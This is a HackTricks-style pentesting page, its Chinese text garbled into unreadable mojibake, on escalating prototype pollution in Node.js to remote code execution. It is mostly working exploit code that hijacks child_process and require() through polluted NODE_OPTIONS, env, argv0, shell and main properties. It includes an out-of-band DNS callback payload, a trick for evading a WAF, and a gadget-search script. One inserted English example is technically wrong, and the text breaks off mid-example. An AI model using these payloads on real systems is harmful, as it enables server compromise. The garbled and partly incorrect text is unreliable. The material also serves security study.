# åŸå‹æ±¡æŸ“åˆ°è¿œç¨‹ä»£ç æ‰§è¡Œ

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricks äº‘ â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ æ¨ç‰¹ ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

* ä½ åœ¨ä¸€å®¶ **ç½‘ç»œå®‰å…¨å…¬å¸** å·¥ä½œå—ï¼Ÿä½ æƒ³åœ¨ HackTricks ä¸­çœ‹åˆ°ä½ çš„ **å…¬å¸å¹¿å‘Š**å—ï¼Ÿæˆ–è€…ä½ æƒ³è·å¾— **PEASS çš„æœ€æ–°ç‰ˆæœ¬æˆ–ä¸‹è½½ HackTricks çš„ PDF** å—ï¼Ÿè¯·æŸ¥çœ‹ [**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼
* å‘ç°æˆ‘ä»¬çš„ç‹¬å®¶ [**NFTs**](https://opensea.io/collection/the-peass-family) é›†åˆ [**The PEASS Family**](https://opensea.io/collection/the-peass-family)
* è·å– [**å®˜æ–¹ PEASS & HackTricks å•†å“**](https://peass.creator-spring.com)
* **åŠ å…¥** [**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**Discord ç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**Telegram ç¾¤ç»„**](https://t.me/peass) æˆ– **å…³æ³¨** æˆ‘çš„ **Twitter** [**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **é€šè¿‡å‘** [**hacktricks ä»“åº“**](https://github.com/carlospolop/hacktricks) **å’Œ** [**hacktricks-cloud ä»“åº“**](https://github.com/carlospolop/hacktricks-cloud) **æäº¤ PR æ¥åˆ†äº«ä½ çš„é»‘å®¢æŠ€å·§ã€‚**

</details>

## å¯è¢«æ”»å‡»çš„ä»£ç 

æƒ³è±¡ä¸€ä¸ªçœŸå®çš„ JS ä»£ç ï¼Œä½¿ç”¨äº†ä»¥ä¸‹ä»£ç ï¼š
```javascript
const { execSync, fork } = require('child_process');

function isObject(obj) {
console.log(typeof obj);
return typeof obj === 'function' || typeof obj === 'object';
}

// Function vulnerable to prototype pollution
function merge(target, source) {
for (let key in source) {
if (isObject(target[key]) && isObject(source[key])) {
merge(target[key], source[key]);
} else {
target[key] = source[key];
}
}
return target;
}

function clone(target) {
return merge({}, target);
}

// Run prototype pollution with user input
// Check in the next sections what payload put here to execute arbitrary code
clone(USERINPUT);

// Spawn process, this will call the gadget that poputales env variables
// Create an a_file.js file in the current dir: `echo a=2 > a_file.js`
var proc = fork('a_file.js');
```
## é€šè¿‡ç¯å¢ƒå˜é‡å®ç°PP2RCE

**PP2RCE** æ„å‘³ç€ **åŸå‹æ±¡æŸ“åˆ°è¿œç¨‹ä»£ç æ‰§è¡Œ**ï¼ˆRemote Code Executionï¼‰ã€‚

æ ¹æ®è¿™ä¸ª[**writeup**](https://research.securitum.com/prototype-pollution-rce-kibana-cve-2019-7609/)ï¼Œå½“ä½¿ç”¨ `child_process` ä¸­çš„æŸä¸ªæ–¹æ³•ï¼ˆå¦‚ `fork` æˆ– `spawn` æˆ–å…¶ä»–æ–¹æ³•ï¼‰ç”Ÿæˆä¸€ä¸ªè¿›ç¨‹æ—¶ï¼Œå®ƒä¼šè°ƒç”¨ `normalizeSpawnArguments` æ–¹æ³•ï¼Œè¯¥æ–¹æ³•ä½¿ç”¨åŸå‹æ±¡æŸ“å·¥å…·æ¥åˆ›å»ºæ–°çš„ç¯å¢ƒå˜é‡ï¼š
```javascript
//See code in https://github.com/nodejs/node/blob/02aa8c22c26220e16616a88370d111c0229efe5e/lib/child_process.js#L638-L686

var env = options.env || process.env;
var envPairs = [];
[...]
let envKeys = [];
// Prototype values are intentionally included.
for (const key in env) {
ArrayPrototypePush(envKeys, key);
}
[...]
for (const key of envKeys) {
const value = env[key];
if (value !== undefined) {
ArrayPrototypePush(envPairs, `${key}=${value}`); // <-- Pollution
}
}
```
æ£€æŸ¥è¿™æ®µä»£ç ï¼Œä½ å¯ä»¥çœ‹åˆ°é€šè¿‡**æ±¡æŸ“`envPairs`**æ¥**æ±¡æŸ“**å±æ€§`.env`æ˜¯å¯èƒ½çš„ã€‚

### **æ±¡æŸ“`__proto__`**

{% hint style="warning" %}
è¯·æ³¨æ„ï¼Œç”±äºnodeçš„`child_process`åº“ä¸­çš„`normalizeSpawnArguments`å‡½æ•°çš„å·¥ä½œæ–¹å¼ï¼Œå½“è°ƒç”¨æŸä¸ªå‡½æ•°ä»¥ä¸ºè¿›ç¨‹è®¾ç½®æ–°çš„ç¯å¢ƒå˜é‡æ—¶ï¼Œä½ åªéœ€è¦**æ±¡æŸ“ä»»ä½•ä¸œè¥¿**å³å¯ã€‚\
ä¾‹å¦‚ï¼Œå¦‚æœä½ æ‰§è¡Œ`__proto__.avar="valuevar"`ï¼Œè¿›ç¨‹å°†è¢«ç”Ÿæˆä¸€ä¸ªåä¸º`avar`ï¼Œå€¼ä¸º`valuevar`çš„å˜é‡ã€‚

ç„¶è€Œï¼Œä¸ºäº†ä½¿**ç¯å¢ƒå˜é‡æˆä¸ºç¬¬ä¸€ä¸ªå˜é‡**ï¼Œä½ éœ€è¦**æ±¡æŸ“**`.env`å±æ€§ï¼Œå¹¶ä¸”ï¼ˆåªæœ‰åœ¨æŸäº›æ–¹æ³•ä¸­ï¼‰è¯¥å˜é‡å°†æˆä¸º**ç¬¬ä¸€ä¸ªå˜é‡**ï¼ˆä»è€Œå…è®¸æ”»å‡»ï¼‰ã€‚

è¿™å°±æ˜¯ä¸ºä»€ä¹ˆåœ¨ä¸‹é¢çš„æ”»å‡»ä¸­**`NODE_OPTIONS`ä¸åœ¨`.env`ä¸­**ã€‚
{% endhint %}

{% code overflow="wrap" %}
```javascript
const { execSync, fork } = require('child_process');

// Manual Pollution
b = {}
b.__proto__.env = { "EVIL":"console.log(require('child_process').execSync('touch /tmp/pp2rce').toString())//"}
b.__proto__.NODE_OPTIONS = "--require /proc/self/environ"

// Trigger gadget
var proc = fork('./a_file.js');
// This should create the file /tmp/pp2rec


// Abusing the vulnerable code
USERINPUT = JSON.parse('{"__proto__": {"NODE_OPTIONS": "--require /proc/self/environ", "env": { "EVIL":"console.log(require(\\\"child_process\\\").execSync(\\\"touch /tmp/pp2rce\\\").toString())//"}}}')

clone(USERINPUT);

var proc = fork('a_file.js');
// This should create the file /tmp/pp2rec
```
{% endcode %}

### æ±¡æŸ“ `constructor.prototype`

{% code-tabs %}
{% code-tabs-item title="exploit.js" %}
```javascript
function exploit() {
  // Create a payload object with a malicious property
  const payload = {
    __proto__: {
      constructor: {
        prototype: {
          exec: require('child_process').execSync('cat /etc/passwd')
        }
      }
    }
  };

  // Trigger the payload by calling the constructor
  const obj = new Object(payload);
}

exploit();
```
{% endcode-tabs-item %}
{% endcode-tabs %}

The above code demonstrates how to poison the `constructor.prototype` property to achieve remote code execution (RCE). 

The `payload` object is created with a `__proto__` property that points to an object with a `constructor` property. The `constructor` property then has a `prototype` property that contains the malicious code to execute. In this case, the code uses the `child_process` module to execute the `cat /etc/passwd` command.

By calling the `Object` constructor with the `payload` object as an argument, the payload is triggered and the malicious code is executed, resulting in the contents of the `/etc/passwd` file being printed to the console.

This technique can be used to exploit applications that deserialize user-supplied data without proper validation, allowing an attacker to inject and execute arbitrary code on the server.
```javascript
const { execSync, fork } = require('child_process');

// Manual Pollution
b = {}
b.constructor.prototype.env = { "EVIL":"console.log(require('child_process').execSync('touch /tmp/pp2rce2').toString())//"}
b.constructor.prototype.NODE_OPTIONS = "--require /proc/self/environ"

proc = fork('a_file.js');
// This should create the file /tmp/pp2rec2


// Abusing the vulnerable code
USERINPUT = JSON.parse('{"constructor": {"prototype": {"NODE_OPTIONS": "--require /proc/self/environ", "env": { "EVIL":"console.log(require(\\\"child_process\\\").execSync(\\\"touch /tmp/pp2rce2\\\").toString())//"}}}}')

clone(USERINPUT);

var proc = fork('a_file.js');
// This should create the file /tmp/pp2rec2
```
## é€šè¿‡ç¯å¢ƒå˜é‡å’Œå‘½ä»¤è¡Œå®ç°PP2RCE

åœ¨[**è¿™ç¯‡æ–‡ç« **](https://blog.sonarsource.com/blitzjs-prototype-pollution/)ä¸­æå‡ºäº†ä¸€ä¸ªç±»ä¼¼çš„è´Ÿè½½ï¼Œä½†æœ‰ä¸€äº›å˜åŒ–ã€‚ä¸»è¦çš„åŒºåˆ«æ˜¯ï¼š

* ä¸å†å°†nodejsçš„**è´Ÿè½½**å­˜å‚¨åœ¨æ–‡ä»¶`/proc/self/environ`ä¸­ï¼Œè€Œæ˜¯å­˜å‚¨åœ¨**`/proc/self/cmdline`**çš„argv0ä¸­ã€‚
* ç„¶åï¼Œä¸å†é€šè¿‡**`NODE_OPTIONS`**æ¥è¦æ±‚æ–‡ä»¶`/proc/self/environ`ï¼Œè€Œæ˜¯è¦æ±‚**`/proc/self/cmdline`**ã€‚

{% code overflow="wrap" %}
```javascript
const { execSync, fork } = require('child_process');

// Manual Pollution
b = {}
b.__proto__.argv0 = "console.log(require('child_process').execSync('touch /tmp/pp2rce2').toString())//"
b.__proto__.NODE_OPTIONS = "--require /proc/self/cmdline"

// Trigger gadget
var proc = fork('./a_file.js');
// This should create the file /tmp/pp2rec2


// Abusing the vulnerable code
USERINPUT = JSON.parse('{"__proto__": {"NODE_OPTIONS": "--require /proc/self/cmdline", "argv0": "console.log(require(\\\"child_process\\\").execSync(\\\"touch /tmp/pp2rce2\\\").toString())//"}}')

clone(USERINPUT);

var proc = fork('a_file.js');
// This should create the file /tmp/pp2rec
```
{% endcode %}

## DNSäº¤äº’

ä½¿ç”¨ä»¥ä¸‹æœ‰æ•ˆè½½è·ï¼Œå¯ä»¥æ»¥ç”¨æˆ‘ä»¬ä¹‹å‰è®¨è®ºè¿‡çš„NODE\_OPTIONSç¯å¢ƒå˜é‡ï¼Œå¹¶é€šè¿‡DNSäº¤äº’æ¥æ£€æµ‹æ˜¯å¦æˆåŠŸï¼š
```json
{
"__proto__": {
"argv0":"node",
"shell":"node",
"NODE_OPTIONS":"--inspect=id.oastify.com"
}
}
```
æˆ–è€…ï¼Œä¸ºäº†é¿å…WAFè¦æ±‚æä¾›åŸŸåï¼š
```json
{
"__proto__": {
"argv0":"node",
"shell":"node",
"NODE_OPTIONS":"--inspect=id\"\".oastify\"\".com"
}
}
```
## PP2RCEæ¼æ´child_processå‡½æ•°

åœ¨è¿™ä¸€èŠ‚ä¸­ï¼Œæˆ‘ä»¬å°†åˆ†æ`child_process`ä¸­çš„æ¯ä¸ªå‡½æ•°ï¼Œä»¥æ‰§è¡Œä»£ç å¹¶æŸ¥çœ‹æ˜¯å¦å¯ä»¥ä½¿ç”¨ä»»ä½•æŠ€æœ¯æ¥å¼ºåˆ¶è¯¥å‡½æ•°æ‰§è¡Œä»£ç ï¼š

<details>

<summary><code>exec</code>çš„åˆ©ç”¨</summary>

{% code overflow="wrap" %}
```javascript
// environ trick - not working
// It's not possible to pollute the .env attr to create a first env var
// because options.env is null (not undefined)

// cmdline trick - working with small variation
// Working after kEmptyObject (fix)
const { exec } = require('child_process');
p = {}
p.__proto__.shell = "/proc/self/exe" //You need to make sure the node executable is executed
p.__proto__.argv0 = "console.log(require('child_process').execSync('touch /tmp/exec-cmdline').toString())//"
p.__proto__.NODE_OPTIONS = "--require /proc/self/cmdline"
var proc = exec('something');

// stdin trick - not working
// Not using stdin

// Windows
// Working after kEmptyObject (fix)
const { exec } = require('child_process');
p = {}
p.__proto__.shell = "\\\\127.0.0.1\\C$\\Windows\\System32\\calc.exe"
var proc = exec('something');
```
<details>

<summary><strong><code>execFile</code> æ¼æ´åˆ©ç”¨</strong></summary>
```javascript
// environ trick - not working
// It's not possible to pollute the .en attr to create a first env var

// cmdline trick - working with a big requirement
// Working after kEmptyObject (fix)
const { execFile } = require('child_process');
p = {}
p.__proto__.shell = "/proc/self/exe" //You need to make sure the node executable is executed
p.__proto__.argv0 = "console.log(require('child_process').execSync('touch /tmp/execFile-cmdline').toString())//"
p.__proto__.NODE_OPTIONS = "--require /proc/self/cmdline"
var proc = execFile('/usr/bin/node');

// stdin trick - not working
// Not using stdin

// Windows - not working
```
å¯¹äº**`execFile`**çš„å·¥ä½œï¼Œå®ƒ**å¿…é¡»æ‰§è¡Œnode**ä»¥ä½¿NODE\_OPTIONSèµ·ä½œç”¨ã€‚\
å¦‚æœå®ƒ**æ²¡æœ‰**æ‰§è¡Œ**node**ï¼Œä½ éœ€è¦æ‰¾å‡ºå¦‚ä½•é€šè¿‡ç¯å¢ƒå˜é‡**ä¿®æ”¹æ‰§è¡Œ**çš„å†…å®¹å¹¶è®¾ç½®å®ƒä»¬ã€‚

å…¶ä»–æŠ€æœ¯**ä¸éœ€è¦**è¿™ä¸ªè¦æ±‚ï¼Œå› ä¸ºå¯ä»¥é€šè¿‡åŸå‹æ±¡æŸ“**ä¿®æ”¹æ‰§è¡Œçš„å†…å®¹**ã€‚ï¼ˆåœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œå³ä½¿ä½ å¯ä»¥æ±¡æŸ“`.shell`ï¼Œä½ ä¹Ÿä¸ä¼šæ±¡æŸ“æ­£åœ¨æ‰§è¡Œçš„å†…å®¹ï¼‰ã€‚

</details>

<details>

<summary><code>fork</code>åˆ©ç”¨</summary>

{% code overflow="wrap" %}
```javascript
// environ trick - working
// Working after kEmptyObject (fix)
const { fork } = require('child_process');
b = {}
b.__proto__.env = { "EVIL":"console.log(require('child_process').execSync('touch /tmp/fork-environ').toString())//"}
b.__proto__.NODE_OPTIONS = "--require /proc/self/environ"
var proc = fork('something');

// cmdline trick - working
// Working after kEmptyObject (fix)
const { fork } = require('child_process');
p = {}
p.__proto__.argv0 = "console.log(require('child_process').execSync('touch /tmp/fork-cmdline').toString())//"
p.__proto__.NODE_OPTIONS = "--require /proc/self/cmdline"
var proc = fork('something');

// stdin trick - not working
// Not using stdin

// execArgv trick - working
// Only the fork method has this attribute
// Working after kEmptyObject (fix)
const { fork } = require('child_process');
b = {}
b.__proto__.execPath = "/bin/sh"
b.__proto__.argv0 = "/bin/sh"
b.__proto__.execArgv = ["-c", "touch /tmp/fork-execArgv"]
var proc = fork('./a_file.js');

// Windows
// Working after kEmptyObject (fix)
const { fork } = require('child_process');
b = {}
b.__proto__.execPath = "\\\\127.0.0.1\\C$\\Windows\\System32\\calc.exe"
var proc = fork('./a_file.js');
```
{% endcode %}

</details>

<details>

<summary><strong><code>spawn</code>åˆ©ç”¨</strong></summary>

{% code overflow="wrap" %}
```javascript
// environ trick - working with small variation (shell and argv0)
// NOT working after kEmptyObject (fix) without options
const { spawn } = require('child_process');
p = {}
// If in windows or mac you need to change the following params to the path of ndoe
p.__proto__.argv0 = "/proc/self/exe" //You need to make sure the node executable is executed
p.__proto__.shell = "/proc/self/exe" //You need to make sure the node executable is executed
p.__proto__.env = { "EVIL":"console.log(require('child_process').execSync('touch /tmp/spawn-environ').toString())//"}
p.__proto__.NODE_OPTIONS = "--require /proc/self/environ"
var proc = spawn('something');
//var proc = spawn('something',[],{"cwd":"/tmp"}); //To work after kEmptyObject (fix)


// cmdline trick - working with small variation (shell)
// NOT working after kEmptyObject (fix) without options
const { spawn } = require('child_process');
p = {}
p.__proto__.shell = "/proc/self/exe" //You need to make sure the node executable is executed
p.__proto__.argv0 = "console.log(require('child_process').execSync('touch /tmp/spawn-cmdline').toString())//"
p.__proto__.NODE_OPTIONS = "--require /proc/self/cmdline"
var proc = spawn('something');
//var proc = spawn('something',[],{"cwd":"/tmp"}); //To work after kEmptyObject (fix)


// stdin trick - not working
// Not using stdin

// Windows
// NOT working after require(fix) without options
const { spawn } = require('child_process');
p = {}
p.__proto__.shell = "\\\\127.0.0.1\\C$\\Windows\\System32\\calc.exe"
var proc = spawn('something');
//var proc = spawn('something',[],{"cwd":"C:\\"}); //To work after kEmptyObject (fix)
```
{% endcode %}

</details>

<details>

<summary><strong><code>execFileSync</code> æ¼æ´åˆ©ç”¨</strong></summary>

{% code overflow="wrap" %}
```javascript
// environ trick - working with small variation (shell and argv0)
// Working after kEmptyObject (fix)
const { execFileSync } = require('child_process');
p = {}
// If in windows or mac you need to change the following params to the path of ndoe
p.__proto__.argv0 = "/proc/self/exe" //You need to make sure the node executable is executed
p.__proto__.shell = "/proc/self/exe" //You need to make sure the node executable is executed
p.__proto__.env = { "EVIL":"console.log(require('child_process').execSync('touch /tmp/execFileSync-environ').toString())//"}
p.__proto__.NODE_OPTIONS = "--require /proc/self/environ"
var proc = execFileSync('something');

// cmdline trick - working with small variation (shell)
// Working after kEmptyObject (fix)
const { execFileSync } = require('child_process');
p = {}
p.__proto__.shell = "/proc/self/exe" //You need to make sure the node executable is executed
p.__proto__.argv0 = "console.log(require('child_process').execSync('touch /tmp/execFileSync-cmdline').toString())//"
p.__proto__.NODE_OPTIONS = "--require /proc/self/cmdline"
var proc = execFileSync('something');

// stdin trick - working
// Working after kEmptyObject (fix)
const { execFileSync } = require('child_process');
p = {}
p.__proto__.argv0 = "/usr/bin/vim"
p.__proto__.shell = "/usr/bin/vim"
p.__proto__.input = ':!{touch /tmp/execFileSync-stdin}\n'
var proc = execFileSync('something');

// Windows
// Working after kEmptyObject (fix)
const { execSync } = require('child_process');
p = {}
p.__proto__.shell = "\\\\127.0.0.1\\C$\\Windows\\System32\\calc.exe"
p.__proto__.argv0 = "\\\\127.0.0.1\\C$\\Windows\\System32\\calc.exe"
var proc = execSync('something');
```
{% endcode %}

</details>

<details>

<summary><strong><code>execSync</code> æ¼æ´åˆ©ç”¨</strong></summary>

{% code overflow="wrap" %}
```javascript
// environ trick - working with small variation (shell and argv0)
// Working after kEmptyObject (fix)
const { execSync } = require('child_process');
p = {}
// If in windows or mac you need to change the following params to the path of ndoe
p.__proto__.argv0 = "/proc/self/exe" //You need to make sure the node executable is executed
p.__proto__.shell = "/proc/self/exe" //You need to make sure the node executable is executed
p.__proto__.env = { "EVIL":"console.log(require('child_process').execSync('touch /tmp/execSync-environ').toString())//"}
p.__proto__.NODE_OPTIONS = "--require /proc/self/environ"
var proc = execSync('something');

// cmdline trick - working with small variation (shell)
// Working after kEmptyObject (fix)
const { execSync } = require('child_process');
p = {}
p.__proto__.shell = "/proc/self/exe" //You need to make sure the node executable is executed
p.__proto__.argv0 = "console.log(require('child_process').execSync('touch /tmp/execSync-cmdline').toString())//"
p.__proto__.NODE_OPTIONS = "--require /proc/self/cmdline"
var proc = execSync('something');

// stdin trick - working
// Working after kEmptyObject (fix)
const { execSync } = require('child_process');
p = {}
p.__proto__.argv0 = "/usr/bin/vim"
p.__proto__.shell = "/usr/bin/vim"
p.__proto__.input = ':!{touch /tmp/execSync-stdin}\n'
var proc = execSync('something');

// Windows
// Working after kEmptyObject (fix)
const { execSync } = require('child_process');
p = {}
p.__proto__.shell = "\\\\127.0.0.1\\C$\\Windows\\System32\\calc.exe"
var proc = execSync('something');
```
{% endcode %}

</details>

<details>

<summary><strong><code>spawnSync</code>åˆ©ç”¨</strong></summary>

{% code overflow="wrap" %}
```javascript
// environ trick - working with small variation (shell and argv0)
// NOT working after kEmptyObject (fix) without options
const { spawnSync } = require('child_process');
p = {}
// If in windows or mac you need to change the following params to the path of node
p.__proto__.argv0 = "/proc/self/exe" //You need to make sure the node executable is executed
p.__proto__.shell = "/proc/self/exe" //You need to make sure the node executable is executed
p.__proto__.env = { "EVIL":"console.log(require('child_process').execSync('touch /tmp/spawnSync-environ').toString())//"}
p.__proto__.NODE_OPTIONS = "--require /proc/self/environ"
var proc = spawnSync('something');
//var proc = spawnSync('something',[],{"cwd":"/tmp"}); //To work after kEmptyObject (fix)


// cmdline trick - working with small variation (shell)
// NOT working after kEmptyObject (fix) without options
const { spawnSync } = require('child_process');
p = {}
p.__proto__.shell = "/proc/self/exe" //You need to make sure the node executable is executed
p.__proto__.argv0 = "console.log(require('child_process').execSync('touch /tmp/spawnSync-cmdline').toString())//"
p.__proto__.NODE_OPTIONS = "--require /proc/self/cmdline"
var proc = spawnSync('something');
//var proc = spawnSync('something',[],{"cwd":"/tmp"}); //To work after kEmptyObject (fix)


// stdin trick - working
// NOT working after kEmptyObject (fix) without options
const { spawnSync } = require('child_process');
p = {}
p.__proto__.argv0 = "/usr/bin/vim"
p.__proto__.shell = "/usr/bin/vim"
p.__proto__.input = ':!{touch /tmp/spawnSync-stdin}\n'
var proc = spawnSync('something');
//var proc = spawnSync('something',[],{"cwd":"/tmp"}); //To work after kEmptyObject (fix)

// Windows
// NOT working after require(fix) without options
const { spawnSync } = require('child_process');
p = {}
p.__proto__.shell = "\\\\127.0.0.1\\C$\\Windows\\System32\\calc.exe"
var proc = spawnSync('something');
//var proc = spawnSync('something',[],{"cwd":"C:\\"}); //To work after kEmptyObject (fix)
```
{% endcode %}

</details>

## å¼ºåˆ¶ç”Ÿæˆ

åœ¨ä¹‹å‰çš„ç¤ºä¾‹ä¸­ï¼Œæ‚¨çœ‹åˆ°äº†å¦‚ä½•è§¦å‘ä¸€ä¸ªéœ€è¦è°ƒç”¨`spawn`çš„åŠŸèƒ½ï¼ˆç”¨äºæ‰§è¡ŒæŸäº›æ“ä½œçš„`child_process`çš„æ‰€æœ‰æ–¹æ³•éƒ½ä¼šè°ƒç”¨å®ƒï¼‰ã€‚åœ¨ä¹‹å‰çš„ç¤ºä¾‹ä¸­ï¼Œè¿™æ˜¯ä»£ç çš„ä¸€éƒ¨åˆ†ï¼Œä½†æ˜¯å¦‚æœä»£ç æ²¡æœ‰è°ƒç”¨å®ƒå‘¢ï¼Ÿ

### æ§åˆ¶`require`æ–‡ä»¶è·¯å¾„

åœ¨è¿™ä¸ª[**å…¶ä»–çš„è§£é‡Š**](https://blog.sonarsource.com/blitzjs-prototype-pollution/)ä¸­ï¼Œç”¨æˆ·å¯ä»¥æ§åˆ¶`require`å°†è¢«æ‰§è¡Œçš„æ–‡ä»¶è·¯å¾„ã€‚åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œæ”»å‡»è€…åªéœ€è¦åœ¨ç³»ç»Ÿä¸­æ‰¾åˆ°ä¸€ä¸ªå°†åœ¨å¯¼å…¥æ—¶æ‰§è¡Œ`spawn`æ–¹æ³•çš„`.js`æ–‡ä»¶ã€‚\
ä¸€äº›å¸¸è§çš„åœ¨å¯¼å…¥æ—¶è°ƒç”¨`spawn`å‡½æ•°çš„æ–‡ä»¶ç¤ºä¾‹åŒ…æ‹¬ï¼š

* /path/to/npm/scripts/changelog.js
* /opt/yarn-v1.22.19/preinstall.js
* åœ¨ä¸‹é¢æ‰¾åˆ°**æ›´å¤šæ–‡ä»¶**

ä»¥ä¸‹ç®€å•çš„è„šæœ¬å°†æœç´¢**child\_process**ä¸­çš„**è°ƒç”¨**ï¼ˆæ²¡æœ‰ä»»ä½•å¡«å……ï¼Œä»¥é¿å…æ˜¾ç¤ºåœ¨å‡½æ•°å†…éƒ¨çš„è°ƒç”¨ï¼‰ï¼š
```bash
find / -name "*.js" -type f -exec grep -l "child_process" {} \; 2>/dev/null | while read file_path; do
grep --with-filename -nE "^[a-zA-Z].*(exec\(|execFile\(|fork\(|spawn\(|execFileSync\(|execSync\(|spawnSync\()" "$file_path" | grep -v "require(" | grep -v "function " | grep -v "util.deprecate" | sed -E 's/.{255,}.*//'
done
# Note that this way of finding child_process executions just importing might not find valid scripts as functions called in the root containing child_process calls won't be found.
```
{% endcode %}

<details>

<summary>é€šè¿‡å…ˆå‰è„šæœ¬æ‰¾åˆ°çš„æœ‰è¶£æ–‡ä»¶</summary>

* node\_modules/buffer/bin/**download-node-tests.js**:17:`cp.execSync('rm -rf node/*.js', { cwd: path.join(__dirname, '../test') })`
* node\_modules/buffer/bin/**test.js**:10:`var node = cp.spawn('npm', ['run', 'test-node'], { stdio: 'inherit' })`
* node\_modules/npm/scripts/**changelog.js**:16:`const log = execSync(git log --reverse --pretty='format:%h %H%d %s (%aN)%n%b%n---%n' ${branch}...).toString().split(/\n/)`
* node\_modules/detect-libc/bin/**detect-libc.js**:18:`process.exit(spawnSync(process.argv[2], process.argv.slice(3), spawnOptions).status);`
* node\_modules/jest-expo/bin/**jest.js**:26:`const result = childProcess.spawnSync('node', jestWithArgs, { stdio: 'inherit' });`
* node\_modules/buffer/bin/**download-node-tests.js**:17:`cp.execSync('rm -rf node/*.js', { cwd: path.join(__dirname, '../test') })`
* node\_modules/buffer/bin/**test.js**:10:`var node = cp.spawn('npm', ['run', 'test-node'], { stdio: 'inherit' })`
* node\_modules/runtypes/scripts/**format.js**:13:`const npmBinPath = execSync('npm bin').toString().trim();`
* node\_modules/node-pty/scripts/**publish.js**:31:`const result = cp.spawn('npm', args, { stdio: 'inherit' });`

</details>

### é€šè¿‡åŸå‹æ±¡æŸ“è®¾ç½® require æ–‡ä»¶è·¯å¾„

{% hint style="warning" %}
**å…ˆå‰çš„æŠ€æœ¯è¦æ±‚**ç”¨æˆ·**æ§åˆ¶è¦ require çš„æ–‡ä»¶çš„è·¯å¾„**ã€‚ä½†è¿™å¹¶ä¸æ€»æ˜¯æ­£ç¡®çš„ã€‚
{% endhint %}

ç„¶è€Œï¼Œå¦‚æœä»£ç åœ¨åŸå‹æ±¡æŸ“ä¹‹åè¦æ‰§è¡Œ requireï¼Œå³ä½¿**ä½ ä¸æ§åˆ¶è¦ require çš„è·¯å¾„**ï¼Œä½ **å¯ä»¥é€šè¿‡æ»¥ç”¨åŸå‹æ±¡æŸ“æ¥å¼ºåˆ¶æ‰§è¡Œä¸åŒçš„è·¯å¾„**ã€‚å› æ­¤ï¼Œå³ä½¿ä»£ç è¡Œç±»ä¼¼äº `require("./a_file.js")` æˆ– `require("bytes")`ï¼Œå®ƒä¹Ÿå°†**è¦æ±‚æ±¡æŸ“çš„åŒ…**ã€‚

å› æ­¤ï¼Œå¦‚æœåœ¨åŸå‹æ±¡æŸ“ä¹‹åæ‰§è¡Œäº† requireï¼Œå¹¶ä¸”æ²¡æœ‰ spawn å‡½æ•°ï¼Œè¿™å°±æ˜¯æ”»å‡»æ–¹æ³•ï¼š

* æ‰¾åˆ°ä¸€ä¸ª**ç³»ç»Ÿå†…çš„ `.js` æ–‡ä»¶**ï¼Œå½“**è¦æ±‚**æ—¶ï¼Œå°†ä½¿ç”¨ `child_process` **æ‰§è¡ŒæŸäº›æ“ä½œ**
* å¦‚æœä½ å¯ä»¥å°†æ–‡ä»¶ä¸Šä¼ åˆ°æ”»å‡»çš„å¹³å°ä¸Šï¼Œä½ å¯ä»¥ä¸Šä¼ ä¸€ä¸ªç±»ä¼¼çš„æ–‡ä»¶
* æ±¡æŸ“è·¯å¾„ä»¥**å¼ºåˆ¶è¦æ±‚åŠ è½½ `.js` æ–‡ä»¶**ï¼Œè¯¥æ–‡ä»¶å°†ä½¿ç”¨ child\_process æ‰§è¡ŒæŸäº›æ“ä½œ
* å½“è°ƒç”¨ child\_process æ‰§è¡Œå‡½æ•°æ—¶ï¼Œ**æ±¡æŸ“ç¯å¢ƒ/cmdline**ä»¥æ‰§è¡Œä»»æ„ä»£ç ï¼ˆå‚è§æœ€åˆçš„æŠ€æœ¯ï¼‰

#### ç»å¯¹ require

å¦‚æœæ‰§è¡Œçš„ require æ˜¯**ç»å¯¹çš„**ï¼ˆ`require("bytes")`ï¼‰ï¼Œå¹¶ä¸”**åŒ…ä¸­ä¸åŒ…å« main** åœ¨ `package.json` æ–‡ä»¶ä¸­ï¼Œä½ å¯ä»¥**æ±¡æŸ“ `main` å±æ€§**ï¼Œä½¿ require æ‰§è¡Œä¸åŒçš„æ–‡ä»¶ã€‚

{% tabs %}
{% tab title="exploit" %}
{% code overflow="wrap" %}
```javascript
// Create a file called malicious.js in /tmp
// Contents of malicious.js in the other tab

// Install package bytes (it doesn't have a main in package.json)
// npm install bytes

// Manual Pollution
b = {}
b.__proto__.main = "/tmp/malicious.js"

// Trigger gadget
var proc = require('bytes');
// This should execute the file /tmp/malicious.js
// The relative path doesn't even need to exist


// Abusing the vulnerable code
USERINPUT = JSON.parse('{"__proto__": {"main": "/tmp/malicious.js", "NODE_OPTIONS": "--require /proc/self/cmdline", "argv0": "console.log(require(\\\"child_process\\\").execSync(\\\"touch /tmp/pp2rce_absolute\\\").toString())//"}}')

clone(USERINPUT);

var proc = require('bytes');
// This should execute the file /tmp/malicious.js wich create the file /tmp/pp2rec
```
{% endcode %}
{% endtab %}

{% tab title="malicious.js" %}
```javascript
const { fork } = require('child_process');
console.log("Hellooo from malicious");
fork("anything");
```
{% endtab %}
{% endtabs %}

#### ç›¸å¯¹è·¯å¾„ require - 1

å¦‚æœåŠ è½½çš„æ˜¯**ç›¸å¯¹è·¯å¾„**è€Œä¸æ˜¯ç»å¯¹è·¯å¾„ï¼Œä½ å¯ä»¥è®© node **åŠ è½½ä¸åŒçš„è·¯å¾„**ï¼š

{% tabs %}
{% tab title="exploit" %}
{% code overflow="wrap" %}
```javascript
// Create a file called malicious.js in /tmp
// Contents of malicious.js in the other tab

// Manual Pollution
b = {}
b.__proto__.exports = { ".": "./malicious.js" }
b.__proto__["1"] = "/tmp"

// Trigger gadget
var proc = require('./relative_path.js');
// This should execute the file /tmp/malicious.js
// The relative path doesn't even need to exist


// Abusing the vulnerable code
